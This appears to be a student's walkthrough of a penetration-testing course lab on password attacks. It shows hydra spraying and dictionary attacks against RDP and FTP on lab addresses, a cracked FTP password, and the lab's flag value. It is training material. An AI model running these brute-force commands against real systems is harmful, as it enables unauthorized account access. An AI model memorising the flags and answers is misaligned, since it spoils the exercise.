# RDP

Spraying a password on RDP service
>``` shell
>kali@kali:~$ echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt
>
>kali@kali:~$ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
>
># ========== Expected Result ==========
>...
>[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:14344399/p:1), ~3586100 tries per task
>[DATA] attacking rdp://192.168.50.202:3389/
>...
>[3389][rdp] host: 192.168.50.202   login: daniel   password: SuperS3cure1337#
>[ERROR] freerdp: The connection failed to establish.
>[3389][rdp] host: 192.168.50.202   login: justin   password: SuperS3cure1337#
>[ERROR] freerdp: The connection failed to establish.
>...
># =====================================
>```

Lab 1 - Follow the steps outlined in this section to leverage a dictionary attack to gain access to RDP on Password Attacks - RDP - VM #1. Find the flag on either one of the user's desktops. To reduce the time it takes to perform the password spraying, you can create a list with the two usernames: justin and daniel.
>``` shell
># Create a Custom Username List
>kali@kali:~$ echo -e "justin\ndaniel" > users.txt
>
>kali@kali:~$ cat users.txt
>
># ========== Expected Result ==========
>justin
>daniel
># =====================================
>
>kali@kali:~$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://192.168.123.202
>
># ========== Expected Result ==========
>
># =====================================
>```
>

Lab 2 - Enumerate Password Attacks - RDP - VM #1 and find another network service. Use the knowledge from this section to get access as the itadmin user and find the flag.
>``` shell
># Enumerate Network Services with Nmap
>kali@kali:~$ nmap -sV 192.168.123.202
>
># ========== Expected Result ==========
>Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-19 11:39 CST
>Nmap scan report for 192.168.123.202
>Host is up (0.079s latency).
>Not shown: 993 closed tcp ports (reset)
>PORT     STATE SERVICE       VERSION
>21/tcp   open  ftp           FileZilla ftpd 1.4.1
>...
># =====================================
>
># Password Attack Against FTP (itadmin)
>kali@kali:~$ hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.123.202 -f
>
># ========== Expected Result ==========
>...
>[21][ftp] host: 192.168.123.202   login: itadmin   password: hellokitty
>...
># =====================================
>
># Login to FTP
>kali@kali:~$ ftp 192.168.123.202
>
>Name (192.168.123.202:kali): itadmin
>Password: hellokitty
>
># ========== Expected Result ==========
>230 Login successful.
>Remote system type is UNIX.
>Using binary mode to transfer files.
>ftp>
># =====================================
>
># Locate the Flag
>ftp> ls
>
># ========== Expected Result ==========
>229 Entering Extended Passive Mode (|||50233|)
>150 Starting data transfer.
>-rw-rw-rw- 1 ftp ftp             282 Jun 09  2022 desktop.ini
>-rw-rw-rw- 1 ftp ftp              38 Dec 19 17:16 flag.txt
>226 Operation successful
># =====================================
>
># Download the Flag
>ftp> get flag.txt
>
># ========== Expected Result ==========
>local: flag.txt remote: flag.txt
>229 Entering Extended Passive Mode (|||50234|)
>150 Starting data transfer.
>100% |***********************************************|    38      598.53 KiB/s    00:00 ETA
>226 Operation successful
>38 bytes received in 00:00 (279.01 KiB/s)
># =====================================
>
>ftp> bye
>
># ========== Expected Result ==========
>221 Goodbye.
># =====================================
>
>kali@kali:~$ cat flag.txt
>
># ========== Expected Result ==========
>OS{746ace50aabf26dd3ad9bef02b632f92}
># =====================================
>```
>OS{746ace50aabf26dd3ad9bef02b632f92}
